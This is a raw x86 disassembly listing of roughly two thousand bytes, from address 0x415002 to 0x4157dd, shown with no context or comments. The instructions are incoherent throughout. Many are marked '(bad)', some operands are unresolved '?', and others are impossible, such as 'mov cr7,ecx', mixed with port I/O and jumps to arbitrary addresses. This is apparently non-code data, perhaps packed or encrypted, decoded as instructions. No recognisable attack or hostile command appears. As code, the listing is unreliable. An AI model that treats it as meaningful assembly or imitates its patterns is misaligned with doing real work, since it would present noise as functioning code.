  415002:	lahf   
  415003:	outs   dx,BYTE PTR ds:[esi]
  415004:	sub    eax,0xda1b8710
  415009:	mov    esi,0x200fb4ea
  41500e:	xor    al,0xdc
  415010:	xor    eax,0x5d6e9e4
  415015:	sbb    edi,ebx
  415017:	in     eax,dx
  415018:	cli    
  415019:	aad    0xd0
  41501b:	fsub   DWORD PTR [ecx]
  41501d:	sub    DWORD PTR [esi],esp
  41501f:	es mov esp,0xe6f7bf4d
  415025:	pop    ecx
  415026:	sbb    esi,DWORD PTR [esi+0x54]
  415029:	cdq    
  41502a:	jmp    0x414fb6
  41502c:	repnz pop edi
  41502e:	fadd   QWORD PTR [di]
  415031:	push   edx
  415032:	arpl   WORD PTR gs:[edi+0x19a4bc5d],bp
  415039:	sahf   
  41503a:	push   ds
  41503b:	lods   eax,DWORD PTR ds:[esi]
  41503c:	push   ebp
  41503d:	leave  
  41503e:	mov    ecx,0xc43577f0
  415043:	mov    cr7,ecx
  415046:	dec    eax
  415047:	cwde   
  415048:	mov    eax,ds:0x688aa535
  41504d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41504e:	imul   ecx,edi,0x3
  415051:	les    ebp,FWORD PTR [edx+0x123c62dc]
  415057:	scas   al,BYTE PTR es:[edi]
  415058:	sbb    eax,0x45e4baaa
  41505d:	adc    al,0x83
  41505f:	mov    ebp,0xeb4045a5
  415064:	cmp    eax,0x7c8e2423
  415069:	or     BYTE PTR [eax-0x4b],bl
  41506c:	sbb    DWORD PTR [ecx+0x2a60fc09],ebp
  415072:	scas   eax,DWORD PTR es:[edi]
  415073:	dec    esp
  415074:	jl     0x415008
  415076:	lods   eax,DWORD PTR ds:[esi]
  415077:	call   0xf180f22b
  41507c:	inc    esp
  41507d:	jecxz  0x415085
  41507f:	mov    bl,0x30
  415081:	cdq    
  415082:	es cs iret 
  415085:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415086:	jo     0x4150c7
  415088:	loop   0x4150df
  41508a:	mov    ch,0x1d
  41508c:	(bad)
  41508f:	repnz ss adc eax,0xe91ca470
  415096:	repnz xchg ebx,eax
  415098:	mov    al,0x3c
  41509a:	xchg   DWORD PTR [esi-0x1a],esi
  41509d:	popf   
  41509e:	jnp    0x41504f
  4150a0:	mov    edx,es
  4150a2:	retf   
  4150a3:	xor    eax,0x43da4477
  4150a8:	adc    dl,al
  4150aa:	mov    bh,0xc4
  4150ac:	push   edx
  4150ad:	jbe    0x41506d
  4150af:	sub    BYTE PTR [esi],ah
  4150b1:	sbb    ebp,DWORD PTR [edx+0x10511802]
  4150b7:	jl     0x41508b
  4150b9:	xor    bh,BYTE PTR [edi+eiz*1+0x9]
  4150bd:	bound  esp,QWORD PTR [edi+0x5782af55]
  4150c3:	cmc    
  4150c4:	jecxz  0x4150de
  4150c6:	in     eax,dx
  4150c7:	xchg   esp,eax
  4150c8:	mov    cl,0x20
  4150cb:	adc    BYTE PTR [esi-0x35d8acd8],dh
  4150d1:	test   al,0xba
  4150d3:	add    al,BYTE PTR [esi-0x25]
  4150d6:	xchg   edi,eax
  4150d7:	lds    esi,FWORD PTR [ebx+0x50]
  4150da:	cld    
  4150db:	out    dx,al
  4150dc:	push   edx
  4150dd:	lahf   
  4150de:	jnp    0x415142
  4150e0:	sub    eax,0x4ec60b6a
  4150e5:	inc    esp
  4150e6:	xor    ecx,ebx
  4150e8:	sbb    eax,0xd5a4bed5
  4150ed:	mov    edx,0xd8459c8e
  4150f2:	xor    bh,ch
  4150f4:	push   es
  4150f5:	int3   
  4150f6:	xor    bh,BYTE PTR [esi]
  4150f8:	(bad)  
  4150f9:	fnstenv [edx+ebp*1+0x52]
  4150fd:	jmp    FWORD PTR [ecx-0x6f]
  415100:	cmp    ecx,ebx
  415102:	mov    ecx,0xec2ed537
  415107:	push   ecx
  415108:	inc    eax
  415109:	adc    ecx,DWORD PTR [eax]
  41510b:	mov    ds:0x94b0f907,eax
  415110:	pusha  
  415111:	test   eax,0xdd4a6852
  415116:	test   BYTE PTR ss:[edx+edx*4],al
  41511a:	mov    bl,0xec
  41511c:	test   DWORD PTR [ebx],ecx
  41511e:	repnz icebp 
  415120:	lea    edx,[ecx+0x292252bd]
  415126:	cmc    
  415127:	adc    al,dh
  415129:	retf   
  41512a:	or     DWORD PTR [eax+0x31bc80e6],edi
  415130:	add    eax,DWORD PTR [edx+eiz*2]
  415133:	push   esi
  415134:	sub    bl,BYTE PTR [ebx+edi*4]
  415137:	mov    al,0xf6
  415139:	sbb    ecx,esi
  41513b:	push   0xf9f59fd9
  415140:	mov    ?,WORD PTR [ebx]
  415142:	sbb    BYTE PTR [esi],0x27
  415145:	push   esp
  415146:	mov    bx,0xc9a5
  41514a:	outs   dx,DWORD PTR ds:[esi]
  41514b:	call   0xfab67177
  415150:	sub    eax,0x4354bd98
  415155:	(bad)
  415158:	jne    0x415160
  41515a:	mov    eax,ds:0xde88cfef
  41515f:	push   cs
  415160:	sbb    ecx,ebp
  415162:	or     bl,BYTE PTR [edx]
  415164:	pop    es
  415165:	jb     0x41515c
  415167:	cmp    esi,DWORD PTR [esi+eax*4-0x5c14d633]
  41516e:	mov    ds:0x28ea03a4,eax
  415173:	push   ds
  415174:	and    BYTE PTR [ecx],ch
  415176:	ins    DWORD PTR es:[edi],dx
  415177:	clc    
  415178:	push   ecx
  415179:	push   ds
  41517a:	(bad)
  41517e:	jl     0x415183
  415180:	mov    bl,0x48
  415182:	mov    dl,0xc1
  415184:	push   ecx
  415185:	adc    bh,BYTE PTR [esi+0x797a45ec]
  41518b:	xchg   ecx,eax
  41518c:	and    BYTE PTR [ecx-0x29b9adac],ch
  415192:	cs jmp 0xe8c9e6dd
  415198:	aas    
  415199:	cmp    eax,0xc916b9ab
  41519e:	add    eax,0x61802423
  4151a3:	jbe    0x41513d
  4151a5:	adc    eax,0x686f4a6c
  4151aa:	out    dx,eax
  4151ab:	lods   eax,DWORD PTR ds:[esi]
  4151ac:	lods   eax,DWORD PTR ds:[esi]
  4151ad:	jmp    0xa95939ab
  4151b2:	dec    esp
  4151b3:	jg     0x415163
  4151b5:	pop    esi
  4151b6:	adc    BYTE PTR [edi+0x317a9f11],bl
  4151bc:	push   ebp
  4151bd:	call   0x3885:0x8f96e935
  4151c4:	sbb    ch,BYTE PTR [ecx-0x7b]
  4151c7:	xor    edx,ebx
  4151c9:	or     eax,0x489a7e5c
  4151ce:	(bad)  
  4151cf:	push   edi
  4151d0:	sbb    dh,cl
  4151d2:	aas    
  4151d3:	pop    es
  4151d4:	dec    esi
  4151d5:	mov    eax,?
  4151d7:	and    BYTE PTR [esi],0xb9
  4151da:	mov    ebp,0x6381fa0b
  4151df:	lock pushw 0x4d57
  4151e4:	xor    cl,bh
  4151e6:	ins    DWORD PTR es:[edi],dx
  4151e7:	jb     0x4151cf
  4151e9:	fucomip st,st(4)
  4151eb:	cdq    
  4151ec:	pop    ds
  4151ed:	sub    DWORD PTR [edx],edx
  4151ef:	or     ecx,DWORD PTR [ebx+0x1c]
  4151f2:	lahf   
  4151f3:	push   es
  4151f4:	jns    0x415190
  4151f6:	mov    bl,0xc4
  4151f8:	punpckhwd mm2,QWORD PTR [ebp+0x62]
  4151fc:	push   ss
  4151fd:	xchg   esi,eax
  4151fe:	mov    ds:0x94c19616,al
  415203:	push   cs
  415204:	js     0x415199
  415206:	and    ecx,esi
  415208:	xchg   esp,eax
  415209:	push   0xffffffa3
  41520b:	sbb    BYTE PTR [ebx],ah
  41520d:	sbb    DWORD PTR [edx+0x3e094059],eax
  415213:	add    dh,BYTE PTR [esi+0xd02c4e1]
  415219:	xchg   edi,eax
  41521a:	jo     0x415266
  41521c:	xlat   BYTE PTR ds:[ebx]
  41521d:	and    BYTE PTR [ebx],ch
  41521f:	jmp    0x177f:0x54b320b6
  415226:	scas   al,BYTE PTR es:[edi]
  415227:	pusha  
  415228:	push   esi
  415229:	inc    esp
  41522a:	push   ebp
  41522b:	jne    0x415251
  41522d:	leave  
  41522e:	push   esp
  41522f:	fld    DWORD PTR [edx]
  415231:	outs   dx,DWORD PTR ds:[esi]
  415232:	pop    ebx
  415233:	mov    ebx,esp
  415235:	outs   dx,DWORD PTR ds:[esi]
  415236:	mov    BYTE PTR [esi],ah
  415238:	leave  
  415239:	pop    ebp
  41523a:	mov    ch,0xa8
  41523c:	ror    DWORD PTR [edx],1
  41523e:	mov    WORD PTR [edi],fs
  415240:	dec    ecx
  415241:	(bad)  
  415242:	mov    ch,0x59
  415244:	mov    ds:0x1ae8bdca,eax
  415249:	mov    ecx,0x6be7748b
  41524e:	les    edx,FWORD PTR [edx+0x560b9d28]
  415254:	xchg   esi,eax
  415255:	pop    edi
  415256:	out    dx,eax
  415257:	jns    0x415235
  415259:	push   0x29
  41525b:	int    0xdd
  41525d:	jecxz  0x41521a
  41525f:	test   al,al
  415261:	scas   eax,DWORD PTR es:[edi]
  415262:	mov    dh,0x55
  415264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415265:	pop    eax
  415266:	jmp    0x21da:0x33e314ec
  41526d:	pop    ecx
  41526e:	pusha  
  41526f:	dec    ebp
  415270:	or     eax,0x3fb2a0f1
  415275:	shr    ebx,0xc9
  415278:	adc    al,0x5f
  41527a:	sub    bl,dh
  41527c:	sbb    BYTE PTR [edi-0x9],ah
  41527f:	xor    ebx,DWORD PTR [esi]
  415281:	pop    ecx
  415282:	mov    WORD PTR fs:[ebx-0x5c1c5bc7],di
  41528a:	stos   DWORD PTR es:[edi],eax
  41528b:	inc    ecx
  41528c:	pop    esp
  41528d:	jl     0x415284
  41528f:	(bad)
  415292:	and    al,0xe1
  415294:	jge    0x415280
  415296:	mov    bh,0xf4
  415298:	jge    0x415291
  41529a:	arpl   WORD PTR [ebp-0x7424602b],cx
  4152a0:	sbb    bl,ah
  4152a2:	inc    eax
  4152a3:	dec    edx
  4152a4:	enter  0xc683,0xb
  4152a8:	and    ecx,DWORD PTR [ecx]
  4152aa:	sbb    al,0x74
  4152ac:	push   0xf4fbeb15
  4152b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152b2:	sub    ebp,DWORD PTR [ecx+eiz*8-0x1d84d9e6]
  4152b9:	aam    0xf7
  4152bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152bc:	call   0x991c:0xb85bd880
  4152c3:	(bad)  
  4152c4:	outs   dx,BYTE PTR ds:[esi]
  4152c5:	xchg   edi,eax
  4152c6:	mov    al,0xf4
  4152c8:	jo     0x415264
  4152ca:	fwait
  4152cb:	dec    ecx
  4152cc:	xchg   edx,eax
  4152cd:	arpl   WORD PTR ds:[edi-0x75],dx
  4152d1:	(bad)  
  4152d2:	xchg   ebp,eax
  4152d3:	lods   eax,DWORD PTR ds:[esi]
  4152d4:	aas    
  4152d5:	mov    eax,ds:0x1c41589b
  4152da:	retf   
  4152db:	lea    edx,[edx+0x25e169df]
  4152e1:	sbb    di,ax
  4152e4:	push   ss
  4152e5:	cmc    
  4152e6:	fiadd  DWORD PTR ds:[edi]
  4152e9:	fwait
  4152ea:	call   0xb63a98db
  4152ef:	aam    0xe2
  4152f1:	popa   
  4152f2:	loope  0x415305
  4152f4:	lds    ebx,FWORD PTR [edx-0x393e7735]
  4152fa:	(bad)  
  4152fb:	shl    ebp,1
  4152fd:	int    0x97
  4152ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415300:	push   ds
  415301:	xor    esi,DWORD PTR [ebx-0x2aa69eec]
  415307:	mov    ecx,0x214e7056
  41530c:	xchg   ecx,eax
  41530d:	inc    esi
  41530e:	test   eax,0xb70ed7b0
  415313:	sbb    al,0xe5
  415315:	dec    eax
  415316:	fwait
  415317:	and    eax,0xeb5f267b
  41531c:	mov    ah,0xa3
  41531e:	mov    ebx,0x85c59bed
  415323:	cmc    
  415324:	mov    dh,0xce
  415326:	mov    eax,ds:0x268db70a
  41532b:	test   DWORD PTR [edi],ebx
  41532d:	and    BYTE PTR [eax-0x34341797],dl
  415333:	les    eax,FWORD PTR ds:0x20240dda
  415339:	or     BYTE PTR [edi+0x45],dh
  41533c:	xchg   ebx,eax
  41533d:	sbb    DWORD PTR [ecx+ecx*4-0x70],ecx
  415341:	gs xchg edi,eax
  415343:	mov    ecx,0x7cb01745
  415348:	in     eax,0x3b
  41534a:	mov    eax,ds:0x4945f8e7
  41534f:	sub    esp,DWORD PTR [eax]
  415351:	cdq    
  415352:	out    0xd4,eax
  415354:	data16 out dx,al
  415356:	add    esi,DWORD PTR [esi]
  415358:	popf   
  415359:	xchg   esp,edi
  41535b:	mov    dl,0x6
  41535d:	lods   al,BYTE PTR ss:[esi]
  41535f:	out    dx,al
  415360:	pop    esi
  415361:	test   eax,0xa845e8b6
  415366:	jb     0x41530f
  415368:	sbb    eax,0xfb55a293
  41536d:	push   edi
  41536e:	inc    ebx
  41536f:	call   0x1e3d6322
  415374:	jns    0x415372
  415376:	cmp    DWORD PTR [ecx],0xe4ee70ff
  41537c:	and    BYTE PTR [ecx],ch
  41537e:	rcr    BYTE PTR [eax+0x2ea14c47],0xe3
  415385:	xchg   edi,eax
  415386:	pop    esp
  415387:	dec    edi
  415388:	mov    cl,0xa6
  41538a:	push   ds
  41538b:	mov    ebp,0xc4bf8694
  415390:	and    eax,0x7f4e27b9
  415395:	cdq    
  415396:	call   0x94e0a074
  41539b:	(bad)  
  41539d:	jmp    DWORD PTR [eax+ebp*8-0x3724eae6]
  4153a4:	sbb    DWORD PTR [ecx-0x2c],ebp
  4153a7:	(bad)  
  4153a8:	xchg   edi,eax
  4153a9:	xchg   esi,eax
  4153aa:	stos   DWORD PTR es:[edi],eax
  4153ab:	aaa    
  4153ac:	inc    ebx
  4153ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153ae:	mov    ebx,0x462101ac
  4153b3:	(bad)  
  4153b4:	out    dx,eax
  4153b5:	adc    DWORD PTR [esi],0x59
  4153b8:	and    al,0x40
  4153ba:	mov    ?,WORD PTR [esi]
  4153bc:	mov    ecx,0xde20e1d3
  4153c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153c2:	test   eax,0xf6106573
  4153c7:	jmp    0x97f51aac
  4153cc:	pusha  
  4153cd:	(bad)  
  4153ce:	mov    al,ds:0x98e4202e
  4153d3:	mov    ch,0xbb
  4153d5:	es and al,0xed
  4153d8:	mov    esi,0x4fd67bb7
  4153dd:	jo     0x4153c2
  4153df:	jns    0x4153b3
  4153e1:	mov    al,0x71
  4153e3:	jnp    0x415416
  4153e5:	jb     0x415403
  4153e7:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153e9:	push   0x883f74b9
  4153ee:	loop   0x4153c6
  4153f0:	lds    edi,FWORD PTR [esi]
  4153f2:	or     ch,bl
  4153f4:	std    
  4153f5:	xchg   edi,eax
  4153f6:	dec    ebp
  4153f7:	or     esi,esi
  4153f9:	pop    es
  4153fa:	push   ds
  4153fb:	mov    ah,0x63
  4153fd:	popa   
  4153fe:	mov    ch,0x24
  415400:	int    0x29
  415402:	xchg   edi,eax
  415403:	dec    eax
  415404:	xchg   ebp,eax
  415405:	inc    esi
  415406:	loope  0x4153fa
  415408:	dec    esp
  415409:	ror    BYTE PTR [ecx+esi*8+0x1],0xcb
  41540e:	or     dl,bh
  415410:	sbb    eax,0x7663dd61
  415415:	jae    0x41540b
  415417:	xlat   BYTE PTR ds:[ebx]
  415418:	xchg   ebp,eax
  415419:	cli    
  41541a:	jge    0x4153d0
  41541c:	sub    esp,DWORD PTR [ebp-0x34809555]
  415422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415423:	scas   al,BYTE PTR es:[edi]
  415424:	and    DWORD PTR [ecx+0x7ab65feb],edi
  41542a:	retf   0xa91c
  41542d:	mov    al,ds:0x957194ab
  415432:	cmp    ch,bh
  415434:	push   ebp
  415435:	jae    0x415449
  415437:	xor    al,0x99
  415439:	test   eax,0x4129552d
  41543e:	or     eax,0xd155dcaa
  415443:	jno    0x41546c
  415445:	cmp    eax,0x9d1fb20f
  41544a:	stos   DWORD PTR es:[edi],eax
  41544b:	test   al,0xf6
  41544d:	dec    edi
  41544e:	enter  0x1e49,0x59
  415452:	shl    BYTE PTR [edx],cl
  415454:	inc    esp
  415455:	jo     0x41541a
  415457:	jne    0x4153f9
  415459:	sahf   
  41545a:	imul   ebx,edx,0xffffffd8
  41545d:	mov    eax,ds:0x4fa9a2ca
  415462:	scas   eax,DWORD PTR es:[edi]
  415463:	in     al,dx
  415464:	icebp  
  415465:	cmp    dh,BYTE PTR [eax-0xb680f3c]
  41546b:	inc    ecx
  41546c:	test   edi,ecx
  41546e:	jb     0x415462
  415470:	scas   al,BYTE PTR es:[edi]
  415471:	outs   dx,BYTE PTR ds:[esi]
  415472:	cmp    esi,ecx
  415474:	mov    WORD PTR [ecx],gs
  415476:	inc    edx
  415477:	lahf   
  415478:	aam    0x6c
  41547a:	pop    es
  41547b:	push   0x6bf9afc
  415480:	push   ebp
  415481:	sub    eax,0x6fdde94b
  415486:	nop
  415487:	jle    0x415427
  415489:	pushf  
  41548a:	pop    eax
  41548b:	mov    ah,0xd8
  41548d:	mul    DWORD PTR [eax-0x1bae53b0]
  415493:	xor    al,0x20
  415495:	xchg   ebp,eax
  415496:	jb     0x4154f9
  415498:	mov    ebx,0x52007c15
  41549d:	mov    ebx,0xcdf06aa
  4154a2:	jl     0x415498
  4154a4:	out    0x9a,eax
  4154a6:	xchg   edi,eax
  4154a7:	add    al,0x20
  4154a9:	popa   
  4154aa:	lods   al,BYTE PTR ds:[esi]
  4154ab:	ror    edx,0xc2
  4154ae:	cmp    ch,cl
  4154b0:	xchg   esp,eax
  4154b1:	pop    ebx
  4154b2:	int    0xb3
  4154b4:	mov    al,0x44
  4154b6:	xchg   DWORD PTR [ebp+0x595766f],ebx
  4154bc:	sub    DWORD PTR [edx-0x5505d948],0x6fe5065
  4154c6:	xchg   edi,eax
  4154c7:	add    BYTE PTR [ecx],0x6c
  4154ca:	mov    esp,0xef939bd8
  4154cf:	and    BYTE PTR es:[ecx],bh
  4154d2:	inc    esi
  4154d3:	push   eax
  4154d4:	adc    DWORD PTR [esi+0x491f611e],ecx
  4154da:	sbb    eax,0xa0cb866a
  4154df:	push   ebp
  4154e0:	not    edi
  4154e2:	sti    
  4154e3:	inc    esi
  4154e4:	call   0x8818:0x1973a4fc
  4154eb:	jbe    0x41550c
  4154ed:	push   ebx
  4154ee:	fadd   DWORD PTR [ebx+0x24]
  4154f1:	mov    esi,0x19ad52f7
  4154f6:	cmp    ah,BYTE PTR [ecx-0x69445dd5]
  4154fc:	retf   
  4154fd:	jae    0x415558
  4154ff:	xor    ebx,DWORD PTR ds:0xe820d0a
  415505:	lahf   
  415506:	sbb    edx,DWORD PTR [esi]
  415508:	repnz push cs
  41550a:	sub    BYTE PTR ds:0xc1ca2048,0x96
  415511:	xor    al,0x6d
  415513:	mov    ch,0x8d
  415515:	repz mov al,ds:0xeb9935f4
  41551b:	sbb    eax,0xdf9f8f61
  415520:	add    eax,0x9e375d55
  415525:	dec    edx
  415526:	mov    al,0x14
  415528:	adc    BYTE PTR [edi-0x3ee6e8eb],bl
  41552e:	les    ebp,FWORD PTR [esi+0x2082411f]
  415534:	push   cs
  415535:	stos   BYTE PTR es:[edi],al
  415536:	push   edx
  415537:	mov    edx,0xbd43920
  41553c:	add    DWORD PTR [ebp-0x37],0x26
  415540:	les    ecx,FWORD PTR [esp+ecx*4+0x705f9ef]
  415547:	int3   
  415548:	in     eax,0x41
  41554a:	loopne 0x415570
  41554c:	dec    ebx
  41554d:	push   ss
  41554e:	cmp    bh,bh
  415550:	sbb    ecx,ebp
  415552:	jbe    0x4155c7
  415554:	pop    edx
  415555:	xor    ch,BYTE PTR [edx+0x12f49f5c]
  41555b:	sbb    ah,BYTE PTR [ebp-0x26]
  41555e:	push   eax
  41555f:	out    dx,al
  415560:	push   ebx
  415561:	or     cl,bl
  415563:	jmp    0x329c:0xd5e0791c
  41556a:	outs   dx,DWORD PTR ds:[esi]
  41556b:	ins    BYTE PTR es:[edi],dx
  41556c:	adc    eax,0x64593bab
  415571:	xor    ebp,esi
  415573:	sbb    DWORD PTR [esi],eax
  415575:	jg     0x4155d5
  415577:	xchg   edx,eax
  415578:	sub    edi,edi
  41557a:	mov    ch,0x4
  41557c:	mov    ch,0xa8
  41557e:	in     al,0x1b
  415580:	cmc    
  415581:	retf   0xf18d
  415584:	add    eax,0x1e5f4f8c
  415589:	dec    ecx
  41558a:	dec    edi
  41558b:	adc    bh,BYTE PTR [ecx+0x15]
  41558e:	cmp    al,BYTE PTR [ebp-0x1da5a150]
  415594:	xchg   ebp,eax
  415595:	xor    DWORD PTR [edi+ebp*8+0x791c94b4],eax
  41559c:	out    dx,al
  41559d:	or     dl,ah
  41559f:	cmc    
  4155a0:	sbb    DWORD PTR [ecx-0x2b],edi
  4155a3:	cmp    eax,0xe7b50617
  4155a8:	not    DWORD PTR [ebx]
  4155aa:	xchg   ecx,eax
  4155ab:	gs add dl,dh
  4155ae:	mov    edx,edx
  4155b0:	fwait
  4155b1:	out    0x8b,eax
  4155b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155b4:	daa    
  4155b5:	imul   ebp,DWORD PTR [eax],0x4d119d89
  4155bb:	repnz sub eax,0xd24bbb9f
  4155c1:	shr    ch,cl
  4155c3:	sbb    BYTE PTR [edx],dl
  4155c5:	mov    bl,0x3
  4155c7:	sub    eax,0xd4be867d
  4155cc:	dec    ecx
  4155cd:	(bad)  
  4155ce:	mov    ebx,DWORD PTR [ebx]
  4155d0:	xchg   ebp,eax
  4155d1:	sbb    eax,0x5a67e767
  4155d6:	lds    esi,FWORD PTR [edx+0x22]
  4155d9:	leave  
  4155da:	mov    dh,0xfb
  4155dc:	out    0xe7,al
  4155de:	sbb    esi,DWORD PTR [ebp-0x71]
  4155e1:	lahf   
  4155e2:	cmp    DWORD PTR [edx+0x5cef4dad],ebx
  4155e8:	sub    esi,DWORD PTR [ecx]
  4155ea:	sbb    eax,0x5c20753b
  4155ef:	pop    ds
  4155f0:	adc    eax,0xd066335c
  4155f5:	push   ecx
  4155f6:	mov    ecx,0x246e8e74
  4155fb:	aas    
  4155fc:	lods   eax,DWORD PTR ds:[esi]
  4155fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155fe:	sbb    eax,DWORD PTR [esi]
  415600:	icebp  
  415601:	jecxz  0x4155ca
  415603:	lds    esp,FWORD PTR [edx-0x77]
  415606:	sbb    al,0x72
  415608:	push   esp
  415609:	pop    ebp
  41560a:	outs   dx,DWORD PTR ds:[esi]
  41560b:	sub    BYTE PTR [edi-0x7a],ah
  41560e:	inc    esp
  41560f:	popa   
  415610:	jb     0x415601
  415612:	mov    dh,0x64
  415614:	popf   
  415615:	test   eax,0x7e10da5b
  41561a:	sbb    bl,BYTE PTR [eax+0x5]
  41561d:	sbb    ebp,DWORD PTR [ecx+0x6d592581]
  415623:	inc    ebx
  415624:	js     0x41569c
  415626:	jmp    0x415691
  415628:	mov    bl,0x9e
  41562a:	imul   esp,DWORD PTR [eax+0x7e60815e],0xffffff9c
  415631:	jbe    0x4155c2
  415633:	imul   ebx,DWORD PTR [edi+0x7b],0x496fd4b3
  41563a:	int3   
  41563b:	retf   
  41563c:	aad    0xd8
  41563e:	(bad)  
  41563f:	(bad)  
  415640:	call   0x3cb629ac
  415645:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415646:	push   ecx
  415647:	retf   
  415648:	pop    esp
  415649:	lahf   
  41564a:	mov    ah,0x17
  41564c:	jp     0x41565c
  41564e:	or     al,0x87
  415650:	inc    edi
  415651:	in     eax,dx
  415652:	out    dx,al
  415653:	les    ebx,FWORD PTR [ecx+0x68130547]
  415659:	push   esi
  41565a:	mov    ecx,0xbf215ac2
  41565f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415660:	inc    edi
  415661:	inc    ecx
  415662:	test   al,0x7c
  415664:	push   ss
  415665:	ins    DWORD PTR es:[edi],dx
  415666:	mov    bl,ch
  415668:	ins    BYTE PTR es:[edi],dx
  415669:	stc    
  41566a:	(bad)  
  41566b:	mov    ds:0xf087cc91,al
  415670:	cld    
  415671:	pop    ecx
  415672:	daa    
  415673:	adc    al,0xcc
  415675:	fwait
  415676:	sub    eax,0x369710f1
  41567b:	xchg   ebp,esp
  41567d:	adc    BYTE PTR [eax-0x4a68291a],dh
  415683:	mov    ds:0xc6457c10,al
  415688:	mov    WORD PTR [ebx+0x1738f3bb],fs
  41568e:	or     ebx,DWORD PTR [ecx-0x12d83567]
  415694:	xor    bl,al
  415696:	mov    edx,0xa83cee34
  41569b:	ret    0xbe55
  41569e:	(bad)  
  41569f:	jmp    0x795d:0x16ec267d
  4156a6:	pop    es
  4156a7:	xchg   esp,eax
  4156a8:	aaa    
  4156a9:	and    eax,0xadca9935
  4156ae:	mov    dh,0x1c
  4156b0:	lds    edx,FWORD PTR [edi-0x3dc619af]
  4156b6:	cli    
  4156b7:	lods   eax,DWORD PTR ds:[esi]
  4156b8:	leave  
  4156b9:	ins    BYTE PTR es:[edi],dx
  4156ba:	out    0xa2,al
  4156bc:	std    
  4156bd:	inc    eax
  4156be:	outs   dx,BYTE PTR ds:[esi]
  4156bf:	in     eax,dx
  4156c0:	cwde   
  4156c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156c2:	fmul   DWORD PTR [ecx-0x77]
  4156c5:	dec    ecx
  4156c6:	jno    0x41565a
  4156c8:	xor    cl,ah
  4156ca:	mov    bh,0x9c
  4156cc:	(bad)  
  4156cd:	sbb    DWORD PTR [edx-0x40d99a38],edx
  4156d3:	je     0x41572c
  4156d5:	in     eax,0x4d
  4156d7:	(bad)  
  4156d8:	sub    cl,BYTE PTR [edx-0x7bdb5020]
  4156de:	mov    ebx,0x27258964
  4156e3:	lock xchg ecx,eax
  4156e5:	dec    ecx
  4156e6:	sbb    ecx,DWORD PTR [esp+ebp*4+0x5c4245dc]
  4156ed:	jmp    0xdd66ca6
  4156f2:	and    al,0xee
  4156f4:	sub    BYTE PTR [eax+0x39f66b5a],ah
  4156fa:	pop    edi
  4156fb:	xchg   esp,eax
  4156fc:	and    al,0xd
  4156fe:	push   0xffffff99
  415700:	xchg   esp,eax
  415701:	cwde   
  415702:	mov    al,0x27
  415704:	bound  ebx,QWORD PTR [ecx+edi*4+0x7e]
  415708:	lds    edi,FWORD PTR [edi+0xf]
  41570b:	in     al,dx
  41570c:	cmp    al,0x78
  41570e:	in     al,0x2a
  415710:	and    ecx,edi
  415712:	sbb    BYTE PTR [edi-0x6af4d46c],bh
  415718:	stos   BYTE PTR es:[edi],al
  415719:	mov    ds:0x19995d5b,eax
  41571e:	xchg   esi,eax
  41571f:	outs   dx,BYTE PTR ds:[esi]
  415720:	xchg   DWORD PTR [edx+0x27bd6ab6],edx
  415726:	mov    dl,0x14
  415728:	or     eax,0xd5b71501
  41572d:	xor    eax,0x69222b4f
  415732:	jge    0x415788
  415734:	call   0xc9f9:0x1d21528b
  41573b:	cli    
  41573c:	div    BYTE PTR [ebp+eiz*4-0x2eee469]
  415743:	add    ecx,DWORD PTR [ebx]
  415745:	mov    ds:0xfaecd44b,al
  41574a:	daa    
  41574b:	push   ss
  41574c:	sbb    edi,DWORD PTR [ecx]
  41574e:	add    DWORD PTR [edx+0x68],ecx
  415751:	ins    DWORD PTR es:[edi],dx
  415752:	out    dx,eax
  415753:	bound  edx,QWORD PTR [edi+ebx*2-0x795a6a2d]
  41575a:	mov    ecx,0x19a525ee
  41575f:	lods   al,BYTE PTR ds:[esi]
  415760:	push   ds
  415761:	fld    DWORD PTR [ebx+edx*8]
  415764:	xchg   DWORD PTR [eax],esi
  415766:	pop    es
  415767:	dec    edi
  415768:	iret   
  415769:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41576a:	(bad)  [ecx+0x6e6385c3]
  415770:	xor    eax,0x682189fb
  415775:	mov    esi,0xa5d1e4ea
  41577a:	stc    
  41577b:	and    al,0x61
  41577d:	sahf   
  41577e:	cmp    ebx,DWORD PTR [edi+ebp*2+0x76]
  415782:	push   eax
  415783:	cmp    BYTE PTR gs:[edx-0x456153b0],dh
  41578a:	mov    ecx,0x601cbb74
  41578f:	into   
  415790:	and    eax,0x3be7bb42
  415795:	mov    al,0x22
  415797:	out    0x23,eax
  415799:	imul   eax,DWORD PTR [eax-0x1],0x74c11c1
  4157a0:	lock rcl dl,0xe2
  4157a4:	aad    0xa2
  4157a6:	sti    
  4157a7:	xor    esi,DWORD PTR [ebp-0x3d]
  4157aa:	adc    esp,eax
  4157ac:	mov    bl,0xd5
  4157ae:	xor    DWORD PTR [edi+eiz*1],edi
  4157b1:	bound  edi,QWORD PTR [edx-0x2647caec]
  4157b7:	rol    BYTE PTR [ecx-0x5f],0xeb
  4157bb:	repz fistp WORD PTR [bp+0x4b]
  4157c0:	xchg   edi,eax
  4157c1:	pop    esi
  4157c2:	mov    cl,0x61
  4157c4:	in     eax,dx
  4157c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157c6:	(bad)  
  4157c7:	les    ebp,FWORD PTR fs:[eax-0xd6a2ce7]
  4157ce:	jmp    0x4157c4
  4157d0:	jge    0x415833
  4157d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157d3:	iret   
  4157d4:	xlat   BYTE PTR ds:[ebx]
  4157d5:	inc    ebx
  4157d6:	cdq    
  4157d7:	xor    ecx,ebx
  4157d9:	loope  0x415798
  4157db:	and    al,0x8f
  4157dd:	push   ebp
